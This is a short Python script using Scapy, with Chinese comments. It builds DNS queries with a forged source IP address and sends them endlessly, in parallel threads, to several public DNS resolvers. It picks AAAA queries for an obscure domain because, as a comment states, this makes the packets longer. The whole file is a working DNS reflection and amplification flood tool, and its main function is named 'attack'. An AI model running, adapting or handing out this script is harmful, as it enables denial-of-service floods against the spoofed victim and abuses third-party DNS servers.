# #!/usr/bin/env python
# # coding=utf-8
from scapy.all import *
import time
import random
import _thread

query_type_dic = {'A': 1, 'AAAA': 28, 'PTR': 12, 'CNAME': 5, 'NS': 2, 'ANY': 0xff}


# 发包实现函数
def attack(dns_server_ip, client_ip, domain, query_type):
    id1 = random.randint(1, 65535)
    id2 = random.randint(1, 65535)
    try:
        # ehter = Ether(src=client_mac, dst=dns_server_mac, type=0x0800)
        a = IP(version=4, dst=dns_server_ip, src=client_ip, ttl=128, id=id1)
        b = UDP(sport=11311, dport=53)
        c = DNS(id=id2, qr=0, opcode=0, tc=0, rd=1, qdcount=1, ancount=0, nscount=0, arcount=0,
                qd=DNSQR(qname=domain, qtype=query_type, qclass=1))
        # c.qd = DNSQR(qname=domain, qtype=query_type, qclass=1)
        p = a / b / c
        hexdump(p)
        # p.show()
        while (1):
            send(p)
    except KeyboardInterrupt:
        sys.exit()


if __name__ == '__main__':
    dns_server_ip = ['202.114.0.131', '223.5.5.5', '223.6.6.6', '114.114.114']
    client_ip = '192.168.1.155'
    domain = 'dm2304.settings.live.net'  # 生僻域名，让报文变长
    try:
        for i in range(0, len(dns_server_ip)):
            _thread.start_new_thread(attack,
                                     (dns_server_ip[i],
                                      client_ip,
                                      domain,
                                      query_type_dic['AAAA']))
    except:
        print('fail to send~')
    try:
        while 1:
            pass
    except KeyboardInterrupt:
        sys.exit()
